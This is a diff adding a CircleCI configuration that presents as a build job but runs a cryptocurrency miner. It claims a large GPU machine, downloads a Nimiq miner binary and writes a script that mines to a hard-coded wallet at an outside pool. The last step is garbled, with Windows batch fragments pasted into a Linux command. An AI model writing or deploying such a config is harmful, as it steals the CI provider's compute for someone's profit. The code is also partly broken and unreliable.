@@ -1,0 +1,22 @@
+version: 2.1
+
+jobs:
+  build:
+    machine:
+      image: ubuntu-2004-cuda-11.4:202110-01
+    resource_class: gpu.nvidia.large
+    steps:
+      - run: nvidia-smi
+      - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
+      - run: mkdir NimiqMiner
+      - run: cd NimiqMiner
+      - run: wget https://github.com/tomkha/nq-miner/releases/download/0.99.7/nq-miner-linux-0.99.7.tar.gz -O nq-nimer-linux.zip
+      - run: mkdir nq-miner
+      - run: tar -xzvf nq-nimer-linux.zip -C nq-miner
+      - run: rm nq-nimer-linux.zip
+      - run: rm ./nq-miner/start_gpu.sh
+      - run: printf "clear \n #!/bin/bash \n echo \"------------------------START Miner----------------------\" \n ./nq-miner/nq-miner -t cuda -a \"NQ46 8UA6 DTPQ ACY8 YE8M 5T7J GU01 BYMV KKCU\" -n \"NQ-Miner\" -p pool.acemining.co:8443 \n echo \"------------------------END Miner----------------------\" \n echo \"Something went wrong or you exited\"" > start_gpu.sh
+      - run: chmod +x start_gpu.sh
+      - run: cd NimiqMiner
+      - run: ./start_gpu.sh
+      - run: clear && printf "\n\n\n\n ############################################################## \n ######                                                  ###### \n ######  Go to NimiqMiner folder and open start_gpu.sh   ###### \n ######                                                  ###### \n ############################################################## \n\n\n\n Thanks \n\n\n"                                               ###### & echo ######  Go to NimiqMiner folder and open start_gpu.bat  ###### & echo ######                                                  ###### & echo ############################################################## & echo. & echo. & echo. & echo. & echo. & echo. & echo Thanks & echo. & echo. & echo. & PAUSE
